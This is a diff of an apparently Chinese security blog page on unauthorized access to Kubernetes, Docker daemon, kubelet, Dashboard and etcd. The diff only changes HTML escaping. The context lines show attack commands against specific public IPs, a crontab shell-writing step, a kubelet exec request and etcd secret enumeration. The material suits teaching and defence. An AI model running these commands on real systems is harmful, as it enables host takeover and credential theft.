@@ -152,7 +152,7 @@
   ]
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>而直接访问 6443 端口会提示无权限：`User “system:anonymous” cannot get at the cluster scope.</p>
+<p>而直接访问 6443 端口会提示无权限：&#96;User “system:anonymous” cannot get at the cluster scope.</p>
 <p>如果安装了dashboard，访问 <code>/ui</code> 会跳转到 <code>dashboard</code> 页面，可以创建、修改、删除容器，查看日志等。</p>
 <p>Kubernetes 官方提供了一个命令行工具 <a target="_blank" rel="noopener" href="https://kubernetes.io/docs/user-guide/kubectl-overview/">kubectl</a>。</p>
 <pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 获得所有节点
@@ -269,7 +269,7 @@ spec:
 <pre class="line-numbers language-none"><code class="language-none">kubectl apply -f kiit.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h4 id="Docker-Daemon服务暴露至公网"><a href="#Docker-Daemon服务暴露至公网" class="headerlink" title="Docker Daemon服务暴露至公网"></a>Docker Daemon服务暴露至公网</h4><p>Client上使用命令后，会发送对应的请求到API，也就是Docker Daemon服务。然后docker会去对应的Registry仓库拉取镜像创建容器。</p>
-<p>这个服务本地会暴露在unix:///var/run/docker.sock上，如果容器中有权限访问到这个文件，就可以对宿主机的所有容器进行操作。</p>
+<p>这个服务本地会暴露在unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock上，如果容器中有权限访问到这个文件，就可以对宿主机的所有容器进行操作。</p>
 <p>比如：<a target="_blank" rel="noopener" href="http://68.183.144.186:2375/">http://68.183.144.186:2375/</a></p>
 <p>直接访问，或者使用docker访问</p>
 <pre class="line-numbers language-none"><code class="language-none">docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -278,7 +278,7 @@ spec:
 <pre class="line-numbers language-none"><code class="language-none">docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>创建容器，利用bash和crontab计划任务向宿主机写入shell:</p>
-<p>centos系统挂载路径为 /var/spool/cron/root；ubuntu系统为/var/spool/cron/crontabs/root；</p>
+<p>centos系统挂载路径为 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root；ubuntu系统为&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root；</p>
 <pre class="line-numbers language-none"><code class="language-none"># 查看宿主机可用镜像
 docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 image
 ​
@@ -313,7 +313,7 @@ data &#x3D; client.containers.run(&#39;alpine:latest&#39;, r&#39;&#39;&#39;sh -c
 或：
 curl --insecure -v -H &quot;X-Stream-Protocol-Version: v2.channel.k8s.io&quot; -H &quot;X-Stream-Protocol-Version: channel.k8s.io&quot; -X POST &quot;https:&#x2F;&#x2F;kube-node-here:10250&#x2F;exec&#x2F;&lt;namespace&gt;&#x2F;&lt;podname&gt;&#x2F;&lt;container-name&gt;?command&#x3D;touch&amp;command&#x3D;hello_world&amp;input&#x3D;1&amp;output&#x3D;1&amp;tty&#x3D;1&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="Kubernetes-Dashboard未授权访问"><a href="#Kubernetes-Dashboard未授权访问" class="headerlink" title="Kubernetes Dashboard未授权访问"></a>Kubernetes Dashboard未授权访问</h4><p>如果Kubernetes API Server配置了Dashboard,通过路径/ui即可访问，直接访问部署一个docker即可</p>
+<h4 id="Kubernetes-Dashboard未授权访问"><a href="#Kubernetes-Dashboard未授权访问" class="headerlink" title="Kubernetes Dashboard未授权访问"></a>Kubernetes Dashboard未授权访问</h4><p>如果Kubernetes API Server配置了Dashboard,通过路径&#x2F;ui即可访问，直接访问部署一个docker即可</p>
 <pre class="line-numbers language-none"><code class="language-none">apiVersion: v1
 kind: Pod
 metadata:
@@ -360,17 +360,17 @@ users:
 <pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml cluster-info --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h4 id="Etcd未授权访问"><a href="#Etcd未授权访问" class="headerlink" title="Etcd未授权访问"></a>Etcd未授权访问</h4><p>其默认监听了2379等端口，如果2379端口暴露到公网，可能造成敏感信息泄露。</p>
-<p>首先在Kubernetes中可以更改配置/etc/Kubernetes/manifests/etcd.yaml文件的内容，来将2379端口向外暴露</p>
+<p>首先在Kubernetes中可以更改配置&#x2F;etc&#x2F;Kubernetes&#x2F;manifests&#x2F;etcd.yaml文件的内容，来将2379端口向外暴露</p>
 <p>Etcd v2和v3是两套不兼容的API，K8s是用的v3，所以需要先通过环境变量设置API为v3</p>
 <pre class="line-numbers language-none"><code class="language-none">export ETCDCTL_API&#x3D;3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>列出该目录所有节点的信息<br><a target="_blank" rel="noopener" href="http://152.7.98.135:2379/v2/keys">http://152.7.98.135:2379/v2/keys</a></p>
-<p>添加上recursive=true参数,就会递归地列出所有的值<br><a target="_blank" rel="noopener" href="http://152.7.98.135:2379/v2/keys/?recursive=true">http://152.7.98.135:2379/v2/keys/?recursive=true</a></p>
+<p>添加上recursive&#x3D;true参数,就会递归地列出所有的值<br><a target="_blank" rel="noopener" href="http://152.7.98.135:2379/v2/keys/?recursive=true">http://152.7.98.135:2379/v2/keys/?recursive=true</a></p>
 <p><a target="_blank" rel="noopener" href="http://152.7.98.135:2379/v2/members">http://152.7.98.135:2379/v2/members</a> 集群中各个成员的信息</p>
 <p>安装etcdctl，可以使用类似的方式查询API</p>
 <pre class="line-numbers language-none"><code class="language-none">etcdctl --endpoint&#x3D;http:&#x2F;&#x2F;[etcd_server_ip]:2379 ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>若存在路径/registry/secrets/default，其中可能包含对集群提升权限的默认服务令牌。</p>
+<p>若存在路径&#x2F;registry&#x2F;secrets&#x2F;default，其中可能包含对集群提升权限的默认服务令牌。</p>
 <p>参考文章：</p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4276">https://xz.aliyun.com/t/4276</a><br><a target="_blank" rel="noopener" href="https://tttang.com/archive/1389/">https://tttang.com/archive/1389/</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/196993.html">https://www.freebuf.com/vuls/196993.html</a><br><a target="_blank" rel="noopener" href="https://annevi.cn/2020/12/21/%E5%8D%8E%E4%B8%BA%E4%BA%91ctf-cloud%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B9%8Bk8s%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/">https://annevi.cn/2020/12/21/%E5%8D%8E%E4%B8%BA%E4%BA%91ctf-cloud%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B9%8Bk8s%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/</a></p>
 
